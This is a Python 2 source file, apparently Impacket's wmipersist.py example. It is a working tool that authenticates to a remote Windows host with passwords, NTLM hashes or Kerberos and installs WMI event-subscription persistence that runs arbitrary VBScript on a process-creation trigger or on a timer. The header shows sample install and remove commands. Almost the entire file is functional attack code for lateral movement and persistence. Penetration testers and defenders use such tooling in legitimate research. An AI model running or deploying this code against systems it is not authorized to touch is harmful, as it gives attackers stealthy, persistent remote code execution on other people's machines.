#!/usr/bin/python
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# This script creates/removes a WMI Event Consumer/Filter and link 
# between both to execute Visual Basic based on the WQL filter 
# or timer specified.
#
# Author:
#  beto (@agsolino)
#
# Example: 
#
# write a file toexec.vbs the following:
#	Dim objFS, objFile
#	Set objFS = CreateObject("Scripting.FileSystemObject")
#	Set objFile = objFS.OpenTextFile("C:\ASEC.log", 8, true)
#	objFile.WriteLine "Hey There!"
#	objFile.Close
#
#
# then excute this script this way, VBS will be triggered once
# somebody opens calc.exe:
#
#  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC 
#   -vbs toexec.vbs 
#   -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance 
#            ISA "Win32_Process" AND TargetInstance.Name = "calc.exe"'
#
# or, if you just want to execute the VBS every XXX milliseconds:
#
#  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC 
#   -vbs toexec.vbs -timer XXX 
#
# to remove the event:
#	wmipersist.py domain.net/adminuser:mypwd@targetHost remove -name ASEC
#
# if you don't specify the password, it will be asked by the script.
# domain is optional.
#
# Reference for:
#  DCOM/WMI

import sys
import argparse
import logging

from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL


class WMIPERSISTENCE:
    def __init__(self, username = '', password = '', domain = '', options= None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__options = options
        self.__lmhash = ''
        self.__nthash = ''
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def checkError(self, banner, resp):
        if resp.GetCallStatus(0) != 0:
            logging.error('%s - ERROR (0x%x)' % (banner, resp.GetCallStatus(0)))
        else:
            logging.info('%s - OK' % banner)

    def run(self, addr):
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, options.aesKey, oxidResolver = False, doKerberos=options.k)

        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        if self.__options.action.upper() == 'REMOVE':
            self.checkError( 'Removing ActiveScriptEventConsumer %s'% self.__options.name, 
                  iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % self.__options.name))

            self.checkError( 'Removing EventFilter EF_%s'% self.__options.name,
                  iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"'% self.__options.name))

            self.checkError( 'Removing IntervalTimerInstruction TI_%s'% self.__options.name,
                  iWbemServices.DeleteInstance('__IntervalTimerInstruction.TimerId="TI_%s"'% self.__options.name))

            self.checkError( 'Removing FilterToConsumerBinding %s'% self.__options.name,
                  iWbemServices.DeleteInstance(r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",Filter="__EventFilter.Name=\"EF_%s\""' % (self.__options.name, self.__options.name)))
        else:
            activeScript ,_ = iWbemServices.GetObject('ActiveScriptEventConsumer')
            activeScript =  activeScript.SpawnInstance()
            activeScript.Name = self.__options.name
            activeScript.ScriptingEngine = 'VBScript'
            activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
            activeScript.ScriptText = options.vbs.read()
            self.checkError('Adding ActiveScriptEventConsumer %s'% self.__options.name, 
                iWbemServices.PutInstance(activeScript.marshalMe()))
        
            if options.filter is not None:
                eventFilter,_ = iWbemServices.GetObject('__EventFilter')
                eventFilter =  eventFilter.SpawnInstance()
                eventFilter.Name = 'EF_%s' % self.__options.name
                eventFilter.CreatorSID =  [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
                eventFilter.Query = options.filter
                eventFilter.QueryLanguage = 'WQL'
                eventFilter.EventNamespace = r'root\cimv2'
                self.checkError('Adding EventFilter EF_%s'% self.__options.name, 
                    iWbemServices.PutInstance(eventFilter.marshalMe()))

            else:
                wmiTimer, _ = iWbemServices.GetObject('__IntervalTimerInstruction')
                wmiTimer = wmiTimer.SpawnInstance()
                wmiTimer.TimerId = 'TI_%s' % self.__options.name
                wmiTimer.IntervalBetweenEvents = int(self.__options.timer)
                #wmiTimer.SkipIfPassed = False
                self.checkError('Adding IntervalTimerInstruction',
                    iWbemServices.PutInstance(wmiTimer.marshalMe()))

                eventFilter,_ = iWbemServices.GetObject('__EventFilter')
                eventFilter =  eventFilter.SpawnInstance()
                eventFilter.Name = 'EF_%s' % self.__options.name
                eventFilter.CreatorSID =  [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
                eventFilter.Query = 'select * from __TimerEvent where TimerID = "TI_%s" ' % self.__options.name
                eventFilter.QueryLanguage = 'WQL'
                eventFilter.EventNamespace = r'root\subscription'
                self.checkError('Adding EventFilter EF_%s'% self.__options.name, 
                    iWbemServices.PutInstance(eventFilter.marshalMe()))

            filterBinding,_ = iWbemServices.GetObject('__FilterToConsumerBinding')
            filterBinding =  filterBinding.SpawnInstance()
            filterBinding.Filter = '__EventFilter.Name="EF_%s"' % self.__options.name
            filterBinding.Consumer = 'ActiveScriptEventConsumer.Name="%s"' % self.__options.name
            filterBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

            self.checkError('Adding FilterToConsumerBinding',
                iWbemServices.PutInstance(filterBinding.marshalMe()))

        dcom.disconnect()

# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print version.BANNER

    parser = argparse.ArgumentParser(add_help = True, description = "Creates/Removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.")

    parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    subparsers = parser.add_subparsers(help='actions', dest='action')

    # A start command
    install_parser = subparsers.add_parser('install', help='installs the wmi event consumer/filter')
    install_parser.add_argument('-name', action='store', required=True, help='event name')
    install_parser.add_argument('-vbs', type=argparse.FileType('r'), required=True, help='VBS filename containing the script you want to run')
    install_parser.add_argument('-filter', action='store', required=False, help='the WQL filter string that will trigger the script')
    install_parser.add_argument('-timer', action='store', required=False, help='the amount of milliseconds after the script will be triggered')

    # A stop command
    remove_parser = subparsers.add_parser('remove', help='removes the wmi event consumer/filter')
    remove_parser.add_argument('-name', action='store', required=True, help='event name')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
 
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

        
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)


    if options.action.upper() == 'INSTALL':
        if (options.filter is None and options.timer is None) or  (options.filter is not None and options.timer is not None):
            logging.error("You have to either specify -filter or -timer (and not both)")
            sys.exit(1)

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    try:
        if domain is None:
            domain = ''

        if options.aesKey is not None:
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        executer = WMIPERSISTENCE(username, password, domain, options)
        executer.run(address)
    except (Exception, KeyboardInterrupt), e:
        #import traceback
        #print traceback.print_exc()
        logging.error(e)
    sys.exit(0)
